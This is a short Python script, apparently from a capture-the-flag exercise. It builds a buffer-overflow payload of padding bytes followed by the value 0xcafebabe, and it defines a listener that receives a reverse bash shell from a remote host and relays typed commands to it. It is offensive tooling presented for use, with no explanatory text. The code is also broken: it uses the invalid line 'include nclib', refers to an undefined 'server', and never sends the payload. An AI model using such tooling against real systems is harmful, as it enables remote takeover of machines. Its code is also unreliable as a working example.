#!/usr/bin/python
include nclib

payload = b"A" * 48
payload += b"B" * 4
payload += b"\xbe\xba\xfe\xca"


def listener(port):
    """ local netcat listener for reverse bash shell from a remote host. """
    for client in server:
        print('Connected to %s:%d' % client.peer)
        command = ""
        while command != "exit":
            try:
                # if command was entered by the user
                if len(command) > 0:
                    # read the line to hide command from output
                    if command in client.readln().decode('utf-8').strip(" "):
                        pass  # disregard the last command

                # get output until dollar sign (bash --posix forces bash-X.X$)
                data = client.read_until('$')
                print(data.decode('utf-8'), end="")  # print string of received bytes

                # get user input command and write command to socket
                command = input(" ")
                client.writeln(command)

            # handle exceptions and exiting
            except KeyboardInterrupt:
                print("\nKeyboardInterrupt")
                exit(1)
            except Exception as e:
                print("\nException Occurred\n")
                print(e)
                exit(1)
        print("Disconnected :-)")
        exit(1)

listener(9000)
